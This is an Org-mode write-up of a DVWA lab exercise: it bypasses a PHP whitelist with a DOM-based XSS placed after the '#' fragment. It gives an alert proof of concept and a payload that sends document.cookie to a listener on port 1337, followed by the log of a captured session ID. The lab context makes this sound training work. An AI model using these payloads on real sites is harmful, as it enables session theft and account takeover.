@@ -1,0 +1,65 @@
+#+TITLE: DVWA - XSS DOM High
+#+AUTHOR: Leonardo Tamiano
+
+* Description
+  Same setup as before, but now the PHP code that is used to filter
+  the input hard-codes all possible valid inputs in a ~switch~
+  statement.
+
+  #+begin_src php
+<?php
+// Is there any input?
+if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
+    # White list the allowable languages
+    switch ($_GET['default']) {
+        case "French":
+        case "English":
+        case "German":
+        case "Spanish":
+            # ok
+            break;
+        default:
+            header ("location: ?default=English");
+            exit;
+    }
+}
+?>
+  #+end_src
+  
+* Solution
+  The trick here is to not pass through the server with the full input
+  malicious. We can do this with the pound character ~#~. In particular,
+  everything after ~#~ does not get sent to the server and is only
+  processed by the browser. This opens up the possibility for the
+  following payload
+
+  #+begin_example
+http://evil/vulnerabilities/xss_d/?default=English#%3Cscript%3Ealert(1);%20%3C/script%3E
+  #+end_example
+
+  With this payload
+
+  1. The server only sees the first part, the part before the ~#~
+     character, which is ~English~. So this passes the checks
+
+  2. The browser however sees the entire param value, and so it uses
+     the entire param value to construct the DOM, which means that the
+     script tag slips through the DOM.
+
+  ------------
+
+  To leak the user cookie we can use the following payload
+
+  #+begin_example
+http://evil/vulnerabilities/xss_d/?default=English#<script>var xhr = new XMLHttpRequest(); xhr.open('GET', `http://localhost:1337/${document.cookie}`, false); xhr.send(null);</script>
+  #+end_example
+  
+  and you get the cookie
+
+  #+begin_example
+[leo@archlinux xss_dom]$ python3 cors-server.py 
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+127.0.0.1 - - [11/Nov/2023 19:03:55] code 404, message File not found
+127.0.0.1 - - [11/Nov/2023 19:03:55] "GET /PHPSESSID=raa5vui83s45lmdpd7bfo3suk3;%20security=high HTTP/1.1" 404 -
+  #+end_example
+  
